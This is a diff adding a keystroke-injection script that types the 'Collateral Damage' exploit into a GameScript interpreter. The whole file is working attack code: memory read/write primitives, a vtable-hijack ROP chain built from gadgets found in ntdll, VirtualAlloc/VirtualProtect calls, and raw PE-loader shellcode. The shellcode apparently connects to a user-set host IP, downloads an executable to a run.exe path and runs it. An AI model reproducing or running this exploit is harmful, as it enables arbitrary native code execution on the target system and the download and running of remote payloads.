@@ -1,0 +1,730 @@
+DELAY 300
+ENTER
+STRING //
+ENTER
+STRING // Collateral Damage - @carrot_c4k3 & @landaire - exploits.forsale
+ENTER
+STRING //
+ENTER
+STRING 
+ENTER
+STRING // !!! PUT YOUR IP BELOW !!!
+ENTER
+STRING // EX: var host_ip = "192.168.1.89"
+ENTER
+STRING var host_ip = "[YOUR IP HERE]"
+ENTER
+STRING 
+ENTER
+STRING // PE loader shellcode
+ENTER
+STRING let pe_loader_code = [
+ENTER
+STRING 233,22,1,0,0,21,0,0,120,22,0,0,15,21,0,0,237,21,0,0,144,22,0,0,237,21,0,0,117,22,0,0,164,22,0,0,0,0,0,0,37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,46,46,92,76,111,99,97,108,83,116,97,116,101,92,114,117,110,46,101,120,101,0,87,83,50,95,51,50,46,100,108,108,0,87,83,65,83,116,97,114,116,117,112,0,87,83,65,67,111,110,110,101,99,116,0,87,83,65,83,111,99,107,101,116,65,0,105,110,101,116,95,97,100,100,114,0,69,120,112,97,110,100,69,110,118,105,114,111,110,109,101,110,116,83,116,114,105,110,103,115,65,0,76,111,97,100,76,105,98,114,97,114,121,65,0,67,114,101,97,116,101,70,105,108,101,65,0,87,114,105,116,101,70,105,108,101,0,82,101,97,100,70,105,108,101,0,86,105,114,116,117,97,108,65,108,108,111,99,0,86,105,114,116,117,97,108,70,114,101,101,0,86,105,114,116,117,97,108,80,114,111,116,101,99,116,0,67,108,111,115,101,72,97,110,100,108,101,0,0,0,0,24,0,0,0,0,128,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,87,65,86,65,85,65,84,86,87,85,83,72,129,236,248,2,0,0,72,131,228,240,72,184,75,0,69,0,82,0,78,0,72,141,140,36,152,0,0,0,72,137,1,72,184,69,0,76,0,66,0,65,0,72,137,65,8,72,184,83,0,69,0,46,0,68,0,72,137,65,16,199,65,24,76,0,76,0,102,131,97,28,0,232,124,4,0,0,72,133,192,116,65,72,137,214,72,184,87,0,83,0,50,0,95,0,72,141,140,36,152,0,0,0,72,137,1,72,184,51,0,50,0,46,0,100,0,72,137,65,8,199,65,16,108,0,108,0,102,131,97,20,0,232,64,4,0,0,72,133,192,116,20,72,137,215,235,51,72,184,4,20,0,0,1,0,0,0,233,53,3,0,0,72,141,21,208,254,255,255,72,137,241,232,58,3,0,0,72,141,13,113,254,255,255,255,208,72,137,199,72,133,192,15,132,151,2,0,0,72,141,21,216,254,255,255,72,137,241,232,22,3,0,0,72,137,68,36,120,72,141,21,209,254,255,255,72,137,241,232,2,3,0,0,72,137,68,36,112,72,141,21,201,254,255,255,72,137,241,232,238,2,0,0,72,137,68,36,104,72,141,21,125,254,255,255,72,137,241,232,218,2,0,0,73,137,197,72,141,21,129,254,255,255,72,137,241,232,200,2,0,0,73,137,199,72,141,21,101,254,255,255,72,137,241,232,182,2,0,0,72,137,68,36,88,72,141,21,140,254,255,255,72,137,241,232,162,2,0,0,72,137,68,36,96,72,141,21,10,254,255,255,72,137,241,232,142,2,0,0,72,137,195,72,141,21,205,253,255,255,72,137,249,232,124,2,0,0,72,137,197,72,141,21,209,253,255,255,72,137,249,232,106,2,0,0,73,137,198,72,141,21,180,253,255,255,72,137,249,232,88,2,0,0,72,137,198,72,141,21,184,253,255,255,72,137,249,232,70,2,0,0,72,137,199,72,141,13,85,253,255,255,76,141,164,36,48,2,0,0,76,137,226,65,184,200,0,0,0,255,211,72,131,100,36,48,0,199,68,36,40,128,0,0,0,199,68,36,32,2,0,0,0,76,137,225,186,0,0,0,64,69,49,192,69,49,201,65,255,213,73,137,196,72,141,148,36,152,0,0,0,102,185,2,2,255,213,131,100,36,40,0,72,131,100,36,32,0,185,2,0,0,0,186,1,0,0,0,65,184,6,0,0,0,69,49,201,65,255,214,72,137,197,185,0,0,0,68,255,215,72,141,148,36,136,0,0,0,199,2,2,0,31,144,137,66,4,72,131,98,8,0,72,131,100,36,48,0,72,131,100,36,40,0,72,131,100,36,32,0,72,137,233,65,184,16,0,0,0,69,49,201,255,214,76,141,76,36,68,65,131,33,0,72,141,84,36,72,131,34,0,72,131,100,36,32,0,72,137,233,65,184,4,0,0,0,65,255,215,133,192,15,132,208,0,0,0,139,124,36,72,15,207,49,201,72,137,250,65,184,0,16,0,0,65,185,4,0,0,0,72,139,92,36,120,255,211,72,137,198,72,131,100,36,32,0,76,141,76,36,68,72,137,233,72,137,194,65,137,248,65,255,215,137,193,184,3,0,0,16,133,201,15,132,10,1,0,0,57,124,36,68,15,133,0,1,0,0,72,141,84,36,76,131,34,0,72,131,100,36,32,0,76,141,76,36,68,72,137,233,65,184,4,0,0,0,65,255,215,133,192,116,111,76,137,100,36,80,68,139,108,36,76,65,15,205,49,201,76,137,234,65,184,0,16,0,0,65,185,4,0,0,0,255,211,73,137,196,72,141,92,36,68,77,137,238,77,133,246,126,70,76,137,234,76,41,242,76,1,226,72,131,100,36,32,0,72,137,233,69,137,240,73,137,217,65,255,215,133,192,15,132,133,0,0,0,139,68,36,68,73,41,198,235,207,184,2,0,0,16,235,122,72,184,4,36,0,0,1,0,0,0,235,110,184,4,0,0,16,235,103,76,141,140,36,128,0,0,0,65,131,33,0,72,137,241,72,137,250,65,184,32,0,0,0,255,84,36,104,76,141,140,36,132,0,0,0,65,131,33,0,72,131,100,36,32,0,72,139,124,36,80,72,137,249,76,137,226,69,137,232,255,84,36,88,76,137,225,49,210,65,184,0,128,0,0,255,84,36,112,72,137,249,72,139,124,36,96,255,215,72,137,233,255,215,255,214,235,5,184,5,0,0,16,72,129,196,248,2,0,0,91,93,95,94,65,92,65,93,65,94,65,95,195,65,87,65,86,65,85,65,84,86,87,85,83,102,129,57,77,90,15,133,159,0,0,0,139,65,60,139,132,1,136,0,0,0,68,139,76,1,24,68,139,68,1,28,68,139,92,1,32,68,139,84,1,36,49,192,69,49,228,77,57,204,15,132,142,0,0,0,73,141,124,36,1,68,137,230,65,141,28,179,139,28,25,128,60,25,0,73,137,252,116,223,72,1,203,73,199,199,255,255,255,255,69,49,228,77,137,230,66,128,124,59,1,0,77,141,127,1,77,141,100,36,1,117,236,73,199,197,255,255,255,255,66,128,124,42,1,0,77,141,109,1,117,244,73,137,252,77,57,253,117,163,69,49,255,73,131,238,1,114,26,66,138,44,58,77,141,103,1,66,58,44,59,77,137,231,116,233,73,137,252,235,132,49,192,235,23,65,141,4,114,15,183,4,1,37,255,63,0,0,65,141,4,128,139,4,1,72,1,200,91,93,95,94,65,92,65,93,65,94,65,95,195,86,101,72,139,4,37,96,0,0,0,72,139,80,24,72,131,194,16,49,192,73,137,208,77,139,72,96,77,133,201,116,83,73,199,195,255,255,255,255,49,246,73,137,242,102,67,131,124,89,2,0,77,141,91,1,72,141,118,1,117,236,72,199,198,255,255,255,255,102,131,124,113,2,0,72,141,118,1,117,244,76,57,222,117,30,69,49,219,73,131,234,1,114,31,67,15,183,52,25,102,66,51,52,25,73,131,195,2,102,247,198,223,255,116,229,77,139,0,73,57,208,117,156,235,9,73,139,80,48,184,1,0,0,0,94,195,204,204,204,1,19,10,0,19,1,95,0,12,48,11,80,10,112,9,96,8,192,6,208,4,224,2,240,1,12,8,0,12,48,11,80,10,112,9,96,8,192,6,208,4,224,2,240,1,1,1,0,1,96,0,0
+ENTER
+STRING ]
+ENTER
+STRING 
+ENTER
+STRING 
+ENTER
+STRING // hex printing helper functions
+ENTER
+STRING let i2c_map = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
+ENTER
+STRING let c2i_map = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'A': 0xA, 'B': 0xB, 'C': 0xC, 'D': 0xD, 'E': 0xE, 'F': 0xF}
+ENTER
+STRING 
+ENTER
+STRING fn hex_to_num(s) {
+ENTER
+STRING 	var str_len = len(s)
+ENTER
+STRING 	var res = 0
+ENTER
+STRING 	for (var i = 0; i < str_len; i++)
+ENTER
+STRING 	{
+ENTER
+STRING 		res = res << 4
+ENTER
+STRING 		res = res + c2i_map[s[i]]
+ENTER
+STRING 	}
+ENTER
+STRING 	return res
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn num_to_hex(num, byte_count) {
+ENTER
+STRING 	if (byte_count > 8) {
+ENTER
+STRING 		byte_count = 8
+ENTER
+STRING 	}
+ENTER
+STRING 	var res = ""
+ENTER
+STRING 	for (var i = 0; i < byte_count * 2; i++) {
+ENTER
+STRING 		var idx = (num >> (4 * i)) & 15
+ENTER
+STRING 		res = i2c_map[idx] + res 
+ENTER
+STRING 	}
+ENTER
+STRING 	return res
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn num_to_hex8(num) {
+ENTER
+STRING 	return num_to_hex(num, 1)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn num_to_hex16(num) {
+ENTER
+STRING 	return num_to_hex(num, 2)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn num_to_hex32(num) {
+ENTER
+STRING 	return num_to_hex(num, 4)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn num_to_hex64(num) {
+ENTER
+STRING 	return num_to_hex(num, 8)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn hex_dump(addr, count) {
+ENTER
+STRING 	for (var i = 0; i < count; i++) {
+ENTER
+STRING 		if (i > 0 && (i % 16) == 0) {
+ENTER
+STRING 			printConsole("\n")
+ENTER
+STRING 		}
+ENTER
+STRING 		var cur_byte = pointerGetUnsignedInteger8Bit(0, addr + i)
+ENTER
+STRING 		printConsole(num_to_hex8(cur_byte) + " ")
+ENTER
+STRING 	}
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn array_fill(arr) {
+ENTER
+STRING 	var arr_len = len(arr)
+ENTER
+STRING 	for (var i = 0; i < arr_len; i++) {
+ENTER
+STRING 		arr[i] = 0x41
+ENTER
+STRING 	}
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn round_down(val, bound) {
+ENTER
+STRING 	return floor(val - (val % bound))
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn array_compare(a1, a2) {
+ENTER
+STRING 	if (len(a1) != len(a2)) {
+ENTER
+STRING 		return false
+ENTER
+STRING 	}
+ENTER
+STRING 	var arr_len = len(a1)
+ENTER
+STRING 	
+ENTER
+STRING 	for (var i = 0; i < arr_len; i++) {
+ENTER
+STRING 		if (a1[i] != a2[i]) {
+ENTER
+STRING 			return false
+ENTER
+STRING 		}
+ENTER
+STRING 	}
+ENTER
+STRING 
+ENTER
+STRING 	return true
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING // shorthand helpers for memory access
+ENTER
+STRING fn write8(addr, val) {
+ENTER
+STRING 	pointerSetUnsignedInteger8Bit(0, addr, val)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn read8(addr) {
+ENTER
+STRING 	return pointerGetUnsignedInteger8Bit(0, addr)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn write16(addr, val) {
+ENTER
+STRING 	pointerSetAtOffsetUnsignedInteger16Bit(0, addr, val)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn read16(addr) {
+ENTER
+STRING 	return pointerGetAtOffsetUnsignedInteger16Bit(0, addr)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn write32(addr, val) {
+ENTER
+STRING 	pointerSetAtOffsetUnsignedInteger(0, addr, val)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn read32(addr) {
+ENTER
+STRING 	return pointerGetAtOffsetUnsignedInteger(0, addr)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING 
+ENTER
+STRING fn write64(addr, val) {
+ENTER
+STRING 	pointerSetAtOffsetUnsignedInteger64Bit(0, addr, val)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn read64(addr) {
+ENTER
+STRING 	return pointerGetAtOffsetUnsignedInteger64Bit(0, addr)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING // helper to read a 64-bit val and automatically make it a hex str
+ENTER
+STRING fn read64_hex(addr) {
+ENTER
+STRING 	var val_low = read32(addr)
+ENTER
+STRING 	var val_high = read32(addr+4)
+ENTER
+STRING 	return num_to_hex32(val_high) + num_to_hex32(val_low)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn read_buf(addr, buf) {
+ENTER
+STRING 	var buf_len = len(buf)
+ENTER
+STRING 	for (var i = 0; i < buf_len; i++) {
+ENTER
+STRING 		buf[i] = read8(addr + i)
+ENTER
+STRING 	}
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn write_buf(addr, buf) {
+ENTER
+STRING 	var buf_len = len(buf)
+ENTER
+STRING 	for (var i = 0; i < buf_len; i++) {
+ENTER
+STRING 		write8(addr+i, buf[i])
+ENTER
+STRING 	}
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn find_bytes(addr, max_len, pattern, buf) {
+ENTER
+STRING 	for (var i = 0; i < max_len; i++) {
+ENTER
+STRING 		read_buf(addr + i, buf)
+ENTER
+STRING 		if (array_compare(pattern, buf)) {
+ENTER
+STRING 			return addr + i
+ENTER
+STRING 		}
+ENTER
+STRING 	}
+ENTER
+STRING 	return 0
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn find64(addr, max_len, v) {
+ENTER
+STRING 	var offset = 0
+ENTER
+STRING 	while (1) {
+ENTER
+STRING 		var temp_val = read64(addr+offset)
+ENTER
+STRING 		if (temp_val == v) {
+ENTER
+STRING 			return addr+offset
+ENTER
+STRING 		}
+ENTER
+STRING 		offset += 8
+ENTER
+STRING 	}
+ENTER
+STRING 	return 0
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING // shorthand funcs
+ENTER
+STRING fn ptr_to_num(p) {
+ENTER
+STRING 	return numberFromRaw64BitUnsignedInteger(p)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn make_cstr(s) {
+ENTER
+STRING 	var str_len = len(s) + 1
+ENTER
+STRING 	var s_ptr = globalArrayNew8Bit(s, str_len)
+ENTER
+STRING 	pointerSetString(s_ptr, 0, s)
+ENTER
+STRING 	return ptr_to_num(s_ptr)
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING var gs_base = 0
+ENTER
+STRING var ntdll_base = 0
+ENTER
+STRING var kernelbase_base = 0
+ENTER
+STRING var longjmp_ptr = 0
+ENTER
+STRING var setjmp_ptr = 0
+ENTER
+STRING var gadget_ptr = 0
+ENTER
+STRING var gadget_rsp0x48_ptr = 0
+ENTER
+STRING var gadget_pushrax_ptr = 0
+ENTER
+STRING fn call_native(func_ptr, rcx, rdx, r8, r9) {
+ENTER
+STRING 	// set this gadget here
+ENTER
+STRING 	gadget_rsp0x48_ptr = gs_base + 0xE04B
+ENTER
+STRING 	gadget_pushrax_ptr = gs_base + 0x1F13A
+ENTER
+STRING 	var call_done = false
+ENTER
+STRING 
+ENTER
+STRING 	// allocate 0x120 (space for vtable + setjmp data)
+ENTER
+STRING 	var obj_ptr = globalArrayNew8Bit("call", 0x100)
+ENTER
+STRING 	var objp = ptr_to_num(obj_ptr)
+ENTER
+STRING 	var vt_ptr = globalArrayNew8Bit("vtable", 0x18)
+ENTER
+STRING 	var vtp = ptr_to_num(vt_ptr)
+ENTER
+STRING 	var stack_size = 0x4000
+ENTER
+STRING 	var stack_ptr = globalArrayNew8Bit("stack", stack_size)
+ENTER
+STRING 	var stackp = ptr_to_num(stack_ptr)
+ENTER
+STRING 	var jmpctx_ptr = globalArrayNew8Bit("jctx", 0x100)
+ENTER
+STRING 	var jcp = ptr_to_num(jmpctx_ptr)
+ENTER
+STRING 
+ENTER
+STRING 	// set up vtable pointers
+ENTER
+STRING 	write64(vtp+8, setjmp_ptr)
+ENTER
+STRING 	write64(objp, vtp)
+ENTER
+STRING 
+ENTER
+STRING 	// trigger vtable call
+ENTER
+STRING 	slBus_destroy(obj_ptr)
+ENTER
+STRING 
+ENTER
+STRING 	memcpy(jmpctx_ptr, 0, obj_ptr, 0, 0x100)
+ENTER
+STRING 
+ENTER
+STRING 	// set up our rop chain
+ENTER
+STRING 	var r10 = 0
+ENTER
+STRING 	var r11 = 0
+ENTER
+STRING 	write64(stackp+stack_size-0xA0, rdx)
+ENTER
+STRING 	write64(stackp+stack_size-0x98, rcx)
+ENTER
+STRING 	write64(stackp+stack_size-0x90, r8)
+ENTER
+STRING 	write64(stackp+stack_size-0x88, r9)
+ENTER
+STRING 	write64(stackp+stack_size-0x80, r10)
+ENTER
+STRING 	write64(stackp+stack_size-0x78, r11)
+ENTER
+STRING 	write64(stackp+stack_size-0x70, func_ptr)
+ENTER
+STRING 	write64(stackp+stack_size-0x68, gadget_pushrax_ptr)
+ENTER
+STRING 	// 0x30 bytes of padding
+ENTER
+STRING 	write64(stackp+stack_size-0x38, 0x15151515)
+ENTER
+STRING 	write64(stackp+stack_size-0x30, gs_base+0x109C4A)
+ENTER
+STRING 	write64(stackp+stack_size-0x28, jcp)
+ENTER
+STRING 	write64(stackp+stack_size-0x20, longjmp_ptr);
+ENTER
+STRING 	
+ENTER
+STRING 	// set up the context to do the longjmp
+ENTER
+STRING 	write64(vtp+8, longjmp_ptr)
+ENTER
+STRING 	write64(objp, vtp)
+ENTER
+STRING 	// rsp
+ENTER
+STRING 	write64(objp+0x10, stackp+stack_size-0xA0)
+ENTER
+STRING 	// rip
+ENTER
+STRING 	write64(objp+0x50, gadget_ptr)
+ENTER
+STRING 	
+ENTER
+STRING 	// trigger vtable call
+ENTER
+STRING 	slBus_destroy(obj_ptr)
+ENTER
+STRING 	var ret_val = read64(stackp+stack_size-0x68)
+ENTER
+STRING 
+ENTER
+STRING 	// clean up our objects
+ENTER
+STRING 	globalArrayDelete("call")
+ENTER
+STRING 	globalArrayDelete("vtable")
+ENTER
+STRING 	globalArrayDelete("stack")
+ENTER
+STRING 	globalArrayDelete("jctx")
+ENTER
+STRING 
+ENTER
+STRING 	return ret_val
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn find_module_base(addr) {
+ENTER
+STRING 	var search_addr = round_down(addr, 0x10000)	
+ENTER
+STRING 
+ENTER
+STRING 	while (1) {
+ENTER
+STRING 		var magic_static = [0x4D, 0x5A]
+ENTER
+STRING 		var magic_read = [0, 0]
+ENTER
+STRING 		read_buf(search_addr, magic_read)
+ENTER
+STRING 
+ENTER
+STRING 		if (array_compare(magic_static, magic_read)) {
+ENTER
+STRING 			return search_addr
+ENTER
+STRING 		}
+ENTER
+STRING 		search_addr -= 0x10000
+ENTER
+STRING 	}
+ENTER
+STRING 	return 0
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn get_dll_exports(base_addr) {
+ENTER
+STRING 	var res = {}
+ENTER
+STRING 	var magic_static = [0x4D, 0x5A]
+ENTER
+STRING 	var magic_read = [0, 0]
+ENTER
+STRING 	read_buf(base_addr, magic_read)
+ENTER
+STRING 
+ENTER
+STRING 	if (!array_compare(magic_static, magic_read)) {
+ENTER
+STRING 		printConsole("Magic is invalid!\n")
+ENTER
+STRING 		return res
+ENTER
+STRING 	}
+ENTER
+STRING 
+ENTER
+STRING 	
+ENTER
+STRING 	var e_lfanew = read32(base_addr+0x3c)
+ENTER
+STRING 	var exports_addr = base_addr + read32(base_addr+e_lfanew+0x70+0x18)
+ENTER
+STRING 
+ENTER
+STRING 	var num_funcs = read32(exports_addr+0x14)
+ENTER
+STRING 	var num_names = read32(exports_addr+0x18)
+ENTER
+STRING 
+ENTER
+STRING 	var funcs_addr = base_addr + read32(exports_addr+0x1c)
+ENTER
+STRING 	var names_addr = base_addr + read32(exports_addr+0x20)
+ENTER
+STRING 	var ords_addr = base_addr + read32(exports_addr+0x24)
+ENTER
+STRING 
+ENTER
+STRING 	for (var i = 0; i < num_names; i++) {
+ENTER
+STRING 		var name_addr = base_addr + read32(names_addr + (4 * i))
+ENTER
+STRING 		var name_str = pointerGetSubstring(0, name_addr, 0x20)
+ENTER
+STRING 		var ordinal = read16(ords_addr + (2 * i))
+ENTER
+STRING 		var func_addr =  base_addr + read32(funcs_addr + (4 * ordinal))
+ENTER
+STRING 		res[name_str] = func_addr
+ENTER
+STRING 		//printConsole("Export: " + name_str + " - " + num_to_hex64(func_addr) + "\n")
+ENTER
+STRING 	}
+ENTER
+STRING 
+ENTER
+STRING 	return res
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING var VirtualAlloc_ptr = 0
+ENTER
+STRING var VirtualProtect_ptr = 0
+ENTER
+STRING fn map_code(code) {
+ENTER
+STRING 	var code_addr = call_native(VirtualAlloc_ptr, 0, 0x100000, 0x3000, 4)
+ENTER
+STRING 	write_buf(code_addr, code)
+ENTER
+STRING 
+ENTER
+STRING 	var oldp_ptr = globalArrayNew8Bit("oldp", 0x100)
+ENTER
+STRING 	var oldpp = ptr_to_num(oldp_ptr)
+ENTER
+STRING 	call_native(VirtualProtect_ptr, code_addr, 0x100000, 0x20, oldpp)
+ENTER
+STRING 	return code_addr
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING fn map_page(addr) {
+ENTER
+STRING 	var code_addr = call_native(VirtualAlloc_ptr, addr, 0x100000, 0x3000, 4)
+ENTER
+STRING 	return code_addr
+ENTER
+STRING }
+ENTER
+STRING 
+ENTER
+STRING 
+ENTER
+STRING // create and dump our object to the terminal
+ENTER
+STRING var slbus_ptr = slBus_create()
+ENTER
+STRING var slp = numberFromRaw64BitUnsignedInteger(slbus_ptr)
+ENTER
+STRING 
+ENTER
+STRING // get the base of the GameScript module via the vtable
+ENTER
+STRING gs_base = read64(slp) - 0x16faf8
+ENTER
+STRING 
+ENTER
+STRING ntdll_base = find_module_base(read64(gs_base + 0x125398))
+ENTER
+STRING kernelbase_base = find_module_base(read64(gs_base + 0x1253A0))
+ENTER
+STRING 
+ENTER
+STRING var setjmp_bytes = [0x48,0x89,0x11,0x48,0x89,0x59,0x08,0x48,0x89,0x69,0x18,0x48,0x89,0x71,0x20,0x48]
+ENTER
+STRING var longjmp_bytes = [0x48,0x8B,0xC2,0x48,0x8B,0x59,0x08,0x48,0x8B,0x71,0x20,0x48,0x8B,0x79,0x28,0x4C]
+ENTER
+STRING var tmp_bytes = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
+ENTER
+STRING 
+ENTER
+STRING setjmp_ptr = find_bytes(ntdll_base, 0x217000, setjmp_bytes, tmp_bytes)
+ENTER
+STRING longjmp_ptr = find_bytes(ntdll_base, 0x217000, longjmp_bytes, tmp_bytes)
+ENTER
+STRING 
+ENTER
+STRING // bytes for the following gadget: pop rdx;pop rcx;pop r8;pop r9;pop r10;pop r11; ret
+ENTER
+STRING var gadget_bytes = [0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]
+ENTER
+STRING tmp_bytes = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
+ENTER
+STRING gadget_ptr = find_bytes(ntdll_base, 0x217000, gadget_bytes, tmp_bytes)
+ENTER
+STRING 
+ENTER
+STRING 
+ENTER
+STRING // get the ntdll & kernel base exports and find VirtualAlloc/Protect
+ENTER
+STRING var kernelbase_exports = get_dll_exports(kernelbase_base)
+ENTER
+STRING var ntdll_exports = get_dll_exports(ntdll_base)
+ENTER
+STRING VirtualAlloc_ptr = kernelbase_exports["VirtualAlloc"]
+ENTER
+STRING VirtualProtect_ptr = kernelbase_exports["VirtualProtect"]
+ENTER
+STRING var VirtualFree_ptr = kernelbase_exports["VirtualFree"]
+ENTER
+STRING 
+ENTER
+STRING 
+ENTER
+STRING // allocate our token info buffer
+ENTER
+STRING var tinfo_ptr = globalArrayNew8Bit("tinfo", 0x2000)
+ENTER
+STRING var tinfop = ptr_to_num(tinfo_ptr)
+ENTER
+STRING 
+ENTER
+STRING // write the ip to the global page
+ENTER
+STRING var global_page = map_page(0x44000000)
+ENTER
+STRING pointerSetString(0, global_page, host_ip)
+ENTER
+STRING 
+ENTER
+STRING // map the pe loader
+ENTER
+STRING var pe_loader_ptr = map_code(pe_loader_code)
+ENTER
+STRING var pe_ret = call_native(pe_loader_ptr, 0, 0, 0, 0)
+ENTER
